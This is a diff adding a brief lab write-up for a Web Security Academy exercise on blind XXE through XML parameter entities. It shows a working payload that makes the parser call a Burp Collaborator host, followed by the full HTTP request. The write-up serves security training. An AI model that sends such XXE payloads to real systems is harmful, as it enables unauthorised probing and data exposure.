@@ -1,0 +1,24 @@
+Blind XXE with out-of-band interaction via XML parameter entities
+
+We make use of Burp Collaborator again, so fire it up. 
+
+Payload used:
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://yhjkkxo3d6727o9d5x6b5hjyxp3fr4.burpcollaborator.net">%xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
+
+You will get a "Parsing error" response, but it's irrelevant. Check Collaborator and you should have received some requests.
+
+Request used:
+POST /product/stock HTTP/1.1
+Host: acb61f1c1fc6b49280453878009400cd.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://acb61f1c1fc6b49280453878009400cd.web-security-academy.net/product?productId=1
+Content-Type: application/xml
+Origin: https://acb61f1c1fc6b49280453878009400cd.web-security-academy.net
+Content-Length: 220
+Connection: close
+Cookie: session=ega2PQtllgE7KYtmxddwitH5UBYKywfA
+
+<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://yhjkkxo3d6727o9d5x6b5hjyxp3fr4.burpcollaborator.net">%xxe; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
